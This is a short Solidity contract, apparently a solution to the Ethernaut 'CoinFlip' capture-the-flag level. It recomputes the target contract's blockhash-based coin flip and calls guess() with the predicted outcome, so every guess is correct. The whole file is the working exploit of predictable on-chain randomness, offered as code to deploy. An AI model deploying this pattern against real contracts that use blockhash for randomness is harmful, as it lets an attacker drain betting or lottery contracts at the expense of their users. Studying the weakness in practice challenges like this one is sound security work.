// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract CoinFlipA{
using SafeMath for uint256;
CoinFlip public attack;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
constructor(address coinflip) public {
attack = CoinFlip(coinflip);
}

function rightguess() public{
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
attack.guess(side);
}

}
